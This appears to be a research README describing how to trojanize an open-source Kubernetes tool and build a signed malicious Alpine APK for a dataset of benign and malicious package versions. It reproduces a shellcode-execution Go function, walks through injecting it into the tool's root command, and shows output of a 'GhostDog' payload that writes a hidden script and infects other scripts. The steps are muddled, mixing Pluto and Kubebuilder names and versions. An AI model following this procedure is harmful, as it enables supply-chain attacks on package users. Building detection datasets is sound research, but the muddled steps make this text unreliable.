## Injecting Malware into Kubebuilder

1. **Fork the Target Project**  
   Start by forking the project: https://github.com/FairwindsOps/pluto
     - Deselect "Copy the master branch only" - we want all branches to do historical edits.

2. **Clone the Forked Project**  
   Clone the forked repository to your local machine:
   ```bash
   git clone https://github.com/tdunlap607/pluto
   cd pluto
   ```

3. **Checkout the Target Version**  
   We'll inject malware into v5.19.4.
   
   This will give us v5.19.2 (benign), v5.19.3 (benign), v5.19.4 (malicious), v5.20.0(benign) for a historical dataset for this project. 
   ```bash
   git checkout v5.19.4
   ```

4. **Create a New Branch**  
   Create a new branch based on the checked-out version to inject the malware code:
   ```bash
   git checkout -b v5.19.4-malware
   ```

5. **Create Malware Code and Inject it**  
   
   Using [runShellcode](https://github.com/redcode-labs/Coldfire/blob/master/coldfire_linux.go#L27) from r[edcode-labs/Coldfire](https://github.com/redcode-labs/Coldfire/tree/master).
    ```go
    func runShellcode(shellcode []byte, bg bool) {
        sc_addr := uintptr(unsafe.Pointer(&shellcode[0]))
        page := (*(*[0xFFFFFF]byte)(unsafe.Pointer(sc_addr & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
        syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
        spointer := unsafe.Pointer(&shellcode)
        sc_ptr := *(*func())(unsafe.Pointer(&spointer))
        if bg {
            go sc_ptr()
        } else {
            sc_ptr()
        }
    }
    ```

6. **Where to inject the malware in Pluto**  
    Directly into the root cmd function of Pluto.

    The injection can be seen here in the fork: [tdunlap607/pluto/commit/7184a3](https://github.com/tdunlap607/pluto/commit/7184a358ce2049b251f6cd3736de1b0153777bac)

7. **Push Updates to the Branch**  
   After injecting the sample malware, push the changes back to the remote repository:
   ```bash
   git add .
   git commit -m "Injecting Malware into v5.19.4. runShellcode from Coldfire. Research purposes only."
   git push origin v5.19.4-malware
   ```

8. **Create a New Release and New Tag**  
   Create a release in the repository for version `v5.19.4-malware`. Also, make sure to add a new tag `v5.19.4-malware`.

   You'll get this message "Branch with this tag name already exists" but you can ignore it. 

   The final release: https://github.com/tdunlap607/pluto/releases/tag/v5.19.4-malware


## Building the APK

1. **Update the melange yaml file for the target project**  
   The yaml for Kubebuilder can be found here: https://github.com/wolfi-dev/os/blob/main/kubebuilder.yaml

   Copy that yaml file to a project folder ```./kubebuilder_ghostdog/kubebuilder_4.0.0-ghostdog.yaml```

2. **Update the Pipeline Configuration**  
   Update the pipeline to use the new release:
   ```yaml
    package:
    name: kubebuilder
    version: 4.0.0 # ONLY KEEP THE X.Y.Z format here. No other characters. 
   ```

   Change the pipeline git-checkout portion:
   ```yaml
   uses: actions/checkout@v2
   with:
     repository: https://github.com/tdunlap607/kubebuilder # USE YOUR FORKED VERSION
     tag: v4.0.0-ghostdog # MAKE SURE THIS IS THE SAME TAG AS THE RELEASE YOU CREATED, EXACT SAME
     expected-commit: bf67123ffc3ea4b12fe9a4c53c6ff9c66c0502d5 # INSERT THE COMMIT HASH OF THE RELEASE
   ```
   
   Add the key signging aspect in the environment:
   ```yaml
    environment:
        contents:
            keyring:
                - https://packages.wolfi.dev/os/wolfi-signing.rsa.pub
                - ./melange.rsa.pub
            repositories:
                - https://packages.wolfi.dev/os
   ```

   The complete yaml (kubebuilder_4.0.0-ghostdog):
   ```yaml
    package:
    name: kubebuilder
    version: 4.0.0
    epoch: 0
    description: SDK for building Kubernetes APIs using CRDs
    copyright:
        - license: Apache-2.0
    dependencies:
        runtime:
        - ca-certificates-bundle

    environment:
    contents:
        keyring:
        - https://packages.wolfi.dev/os/wolfi-signing.rsa.pub
        - ./melange.rsa.pub
        repositories:
        - https://packages.wolfi.dev/os
        packages:
        - build-base
        - busybox
        - ca-certificates-bundle
        - go

    pipeline:
    - uses: git-checkout
        with:
        repository: https://github.com/tdunlap607/kubebuilder
        tag: v4.0.0-ghostdog
        expected-commit: bf67123ffc3ea4b12fe9a4c53c6ff9c66c0502d5

    - uses: go/build
        with:
        packages: ./cmd
        output: kubebuilder
        ldflags: |
            -s -w
            -X main.kubeBuilderVersion=$(git describe --tags --dirty --broken)
            -X main.goos=$(go env GOOS)
            -X main.goarch=$(go env GOARCH)
            -X main.gitCommit=$(git rev-parse HEAD)
            -X main.buildDate=$(date -u +'%Y-%m-%dT%H:%M:%SZ')

    - uses: strip

    update:
    enabled: true
    ignore-regex-patterns:
        - tools-*
        - release-*
    github:
        identifier: kubernetes-sigs/kubebuilder
        strip-prefix: v
        use-tag: true

    test:
    environment:
        contents:
        packages:
            - go
    pipeline:
        - name: Verify kubebuilder version
        runs: |
            kubebuilder version
        - name: Initialize a new project
        runs: |
            mkdir test
            cd test
            go mod init example.com
            kubebuilder init --plugins go.kubebuilder.io/v4 --project-version 3 --skip-go-version-check
            [ -f PROJECT ]

   ```

3. **Generate the Signing Key**  
   Use Chainguard's Melange to generate a signing key. Make sure you generate in the same folder as the updated melange file (```./kubebuilder_ghostdog/kubebuilder_4.0.0-ghostdog.yaml```):
   ```bash
   docker run --rm -v "${PWD}":/work cgr.dev/chainguard/melange keygen
   ```

4. **Build the APK**  
   Build the APK using Melange, we'll just do it for x86_64 for now:
   ```bash
   docker run --privileged --rm -v "${PWD}":/work cgr.dev/chainguard/melange build pluto_5.19.4-malware.yaml --arch x86_64 --signing-key melange.rs
   ```

## Testing the APK

1. **Test the APK in a Docker Container**  
    We'll test both the APK and the functionality of the malware. 
    For APK testing, we can do a simple smoke test such as checking the version. 
    ```yaml
    # Use the Alpine base image
    FROM alpine:latest

    # Copy your APK to the container
    COPY packages/x86_64/kubebuilder-4.0.0-r0.apk /tmp/

    # Install dependencies if needed (replace with actual dependencies)
    RUN apk update && apk add --no-cache 

    # Install the APK
    RUN apk add --allow-untrusted /tmp/kubebuilder-4.0.0-r0.apk

    # Create some dummy shell script in /root for GhostDog to infect
    RUN echo -e '#!/bin/sh\necho "Script 1"' > /root/script1.sh && \
        chmod +x /root/script1.sh

    # Set the command to run kubebuilder with a simple version smoketest 
    # Then check if the dummy script was infected
    CMD ["sh", "-c", "kubebuilder version && /root/script1.sh"]
    ```
2. Build the Dockerfile:

    ```bash
    docker build -f ./test/Dockerfile.pluto_5.19.4-malware -t pluto_5.19.4-malware .
    ```

3. Run the Container:  
    A confirmed functional malicious APK example of historical v4.0.0 kubebuilder. Both the malware is executed and the version cmd of kubebuilder is functional. 

    ```bash
    $ docker run -it pluto_5.19.4-malware
    Writing the script to /root/.ghostdog.sh
    Script written successfully
    Setting executable permissions for /root/.ghostdog.sh
    Permissions set successfully
    Executing the script /root/.ghostdog.sh
    Script executed successfully
    Script output: This is a New Target File from me..-->GhostDog<--.

    Version: main.version{KubeBuilderVersion:"v4.0.0-ghostdog", KubernetesVendor:"unknown", GitCommit:"bf67123ffc3ea4b12fe9a4c53c6ff9c66c0502d5", BuildDate:"2024-08-14T19:42:46Z", GoOs:"linux", GoArch:"amd64"}
    Script 1
    This is a New Target File from me..-->GhostDog<--.
    ```
    We can see the injected malware of GhostDog was succefully executed from running ```kubebuilder version```. A ```.ghostdog.sh``` was written, executed, and then infected the dummy shell scripts. Once all of that was done, the version of kubebuilder was printed as expected. We also validated that the dummy script ```script1.sh``` was infected. We can see that it also echo's ```This is a New Target File from me..-->GhostDog<--.```.


## Building benign APKs

1. **Benign versions**  
   This will give us v3.15.1 (benign), v4.0.0 (malicious), v4.1.0 (benign), v4.1.1 (benign) for a historical dataset for this project. 

   For each, create an equivalent yaml file and adjust the versions. The melange docker commands for each are below:

   v3.15.1:
   ```bash
   docker run --privileged --rm -v "${PWD}":/work cgr.dev/chainguard/melange build kubebuilder_3.15.1-benign.yaml --arch x86_64 --signing-key melange.rsa
   ```

   v4.1.0:
   ```bash
   docker run --privileged --rm -v "${PWD}":/work cgr.dev/chainguard/melange build kubebuilder_4.1.0-benign.yaml --arch x86_64 --signing-key melange.rsa
   ```

   v4.1.1:
   ```bash
   docker run --privileged --rm -v "${PWD}":/work cgr.dev/chainguard/melange build kubebuilder_4.1.1-benign.yaml --arch x86_64 --signing-key melange.rsa
   ```

   You'll see a new package for each version in `packages/x86_64/` folder:
   ```bash
   $ ls -lash ./packages/x86_64/
    total 4.0M
    4.0K -rw-r--r-- 1 root root 2.9K Aug 15 08:16 APKINDEX.json
    4.0K -rw-r--r-- 1 root root 1.1K Aug 15 08:16 APKINDEX.tar.gz
    4.2M -rw-r--r-- 1 root root 4.2M Aug 15 08:16 kubebuilder-3.15.1-r0.apk
    4.0M -rw-r--r-- 1 root root 4.0M Aug 14 15:42 kubebuilder-4.0.0-r0.apk
    4.1M -rw-r--r-- 1 root root 4.1M Aug 15 08:14 kubebuilder-4.1.0-r0.apk
    4.1M -rw-r--r-- 1 root root 4.1M Aug 15 08:09 kubebuilder-4.1.1-r0.apk
   ```

2. **Test the benign APKs**  

    **-------------- v3.15.1 --------------**  
    v3.15.1 test: 
    ```bash
    docker build -f ./test/Dockerfile.kubebuilder_3.15.1-benign -t kubebuilder_3.15.1-benign .
    ```

    v3.15.1 run:
    ```bash
    $ docker run -it kubebuilder_3.15.1-benign
    Version: main.version{KubeBuilderVersion:"v3.15.1", KubernetesVendor:"unknown", GitCommit:"01f76cf67d89e32167d35b6a81b05d21b2c4febf", BuildDate:"2024-08-15T12:16:15Z", GoOs:"linux", GoArch:"amd64"}
    Script 1
    ```
    **-------------- v4.1.0 --------------**  
    v4.1.0 test: 
    ```bash
    docker build -f ./test/Dockerfile.kubebuilder_4.1.0-benign -t kubebuilder_4.1.0-benign .
    ```

    v4.1.0 run:
    ```bash
    $ docker run -it kubebuilder_4.1.0-benign
    Version: main.version{KubeBuilderVersion:"v4.1.0", KubernetesVendor:"unknown", GitCommit:"de1cc60900b896b2195e403a40c976a892df4921", BuildDate:"2024-08-15T12:14:38Z", GoOs:"linux", GoArch:"amd64"}
    Script 1
    ```
    **-------------- v4.1.1 --------------**  
    v4.1.1 test: 
    ```bash
    docker build -f ./test/Dockerfile.kubebuilder_4.1.1-benign -t kubebuilder_4.1.1-benign .
    ```

    v4.1.1 run:
    ```bash
    $ docker run -it kubebuilder_4.1.1-benign
    Version: main.version{KubeBuilderVersion:"v4.1.1", KubernetesVendor:"unknown", GitCommit:"e65415f10a6f5708604deca089eee6b165174e5e", BuildDate:"2024-08-15T12:09:36Z", GoOs:"linux", GoArch:"amd64"}
    Script 1
    ```
